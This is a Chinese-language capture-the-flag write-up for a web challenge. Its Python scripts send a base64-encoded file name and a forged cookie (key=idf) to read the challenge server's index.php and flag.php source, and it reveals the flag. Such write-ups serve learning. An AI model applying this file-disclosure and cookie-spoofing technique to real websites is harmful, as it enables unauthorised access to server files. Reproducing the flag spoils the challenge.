## 问题
这里这里→ http://ctf.idf.cn/game/web/40/index.php

## write up
百度了半天，虽然得到了题解。但是题解用的python代码涉及到的都是没用过的python库。于是自己去搜索urllib之类的学习。。。没学习关于cookie的东西，或者说自己懒得学。

最后还是打算依据题解的代码去学习，结果发现这是一个requests库，
利用命令 `pip install requests` 把他安装了，然后我也可以用题解的代码了，good

就是要发送一个自己伪造的cookies给网站，至于用python怎么发送就看代码了。然后网上的人说用firebug也可以，但是我不会啊！

总之就是利用第三方库requests来完成，话说代码好简洁！

### 代码
#### 最终代码
```python
# -*- coding: utf-8 -*-
# version: Python3.X
__author__ = '__L1n__w@tch'

# url: http://ctf.idf.cn/game/web/40/index.php?line=&file=ZmxhZy50eHQ
# 思路:
# 1. 看原始url，里面的file=，怀疑是base64，试一下, 加上2个等于号解密得到flag.txt
# 2. 试一下获取index.php的内容
# 3. 从index.php源码知道要获取flag.php的内容，同时得加个cookie["key"]

import base64
import requests


def main():
    index_php = get_index_php()
    print(index_php)
    flag_php = get_flag_php()
    print(flag_php)


def get_flag_php():
    print("Start to get flag.php: ")
    flag_source_code = str()
    cookies = {"key": "idf"}
    file = base64.b64encode(b"flag.php").decode("utf8")
    url = "http://ctf.idf.cn/game/web/40/index.php?line={}&file={}".format(0, file)
    flag_source_code += requests.get(url, cookies=cookies).text

    return flag_source_code


def get_index_php():
    print("Start to get index.php: ")
    source_code = str()
    index_url = base64.b64encode(b"index.php").decode("utf8")
    for i in range(20):
        url = "http://ctf.idf.cn/game/web/40/index.php?line={}&file={}".format(i, index_url)
        response = requests.get(url)
        source_code += response.text

    return source_code


if __name__ == "__main__":
    main()
```

运行完得到结果: `<?php $flag='wctf{idf_c00kie}'; ?>`

#### 其余代码
```python
import urllib.request

def url_open( url ) :
    req = urllib.request.Request( url )
    response = urllib.request.urlopen( url )
    html = response.read()

    return html

def download() :
    for i in range( 20 ) :
        url = 'http://ctf.idf.cn/game/web/40/index.php?line=' + str( i ) + '&file=aW5kZXgucGhw'
        html = url_open( url )
        html = html.decode( 'utf-8' )
        print( html,end=' ' )

if __name__ == '__main__' :
    download()
```

```python
# -*- coding: utf-8 -*- # #用中文字符改变编码方式为UTF-8

#_author_楠
import requests  #调用url、cookie操作 文件操作的库
import sys

cookies = {'key' : 'idf'} #设置cookies为key值为idf 即cookies欺骗

for i in range(0,3): #循环打开网页并抓取网页文本信息存入本地
   url="http://ctf.idf.cn/game/web/40/index.php?line=" + \
        str(i) + "&file=ZmxhZy5waHA="
   wp = requests.get(url, cookies=cookies)
   print( wp.text )
   with open( './flag.txt','a+' ) as f :
      print( f.tell() )
      f.seek( 0,0 )
      f.write( wp.text )

print("get flag success")
```



